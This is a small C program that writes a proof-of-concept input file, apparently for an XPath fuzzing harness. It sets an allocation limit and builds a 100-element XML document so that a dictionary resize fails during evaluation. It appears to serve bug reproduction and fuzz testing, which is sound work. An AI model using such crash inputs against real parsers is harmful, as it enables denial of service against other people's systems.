#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Bytes 0-3: maxAllocs = 30 (big-endian) to allow init but fail dict resize */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x1E, f);
    
    /* XPath expression: "//*" selects all elements, triggers dict growth */
    fputs("//*", f);
    fputc(0x5C, f);
    fputc(0x0A, f);
    
    /* XML with many elements to force dict resizing during evaluation */
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<r>");
    for (int i = 0; i < 100; i++) {
        fprintf(f, "<a/>");
    }
    fprintf(f, "</r>");
    fputc(0x5C, f);
    fputc(0x0A, f);
    
    fclose(f);
    return 0;
}